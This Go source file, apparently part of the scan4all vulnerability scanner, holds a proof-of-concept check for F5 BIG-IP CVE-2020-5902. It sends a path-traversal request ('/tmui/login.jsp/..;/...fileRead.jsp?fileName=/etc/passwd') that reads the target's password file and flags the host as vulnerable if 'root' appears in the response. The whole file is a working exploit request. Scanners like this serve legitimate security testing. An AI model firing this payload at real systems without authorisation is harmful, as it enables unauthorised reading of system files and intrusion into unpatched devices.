package f5

import (
	"fmt"
	"github.com/hktalent/scan4all/lib/util"
)

func CVE_2020_5902(u string) bool {
	if req, err := util.HttpRequset(u+"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && util.StrContains(req.Body, "root") {
			util.GoPocLog(fmt.Sprintf("Found F5 BIG-IP CVE_2020_5902|--\"%s\"\n", u))
			return true
		}
	}
	return false
}
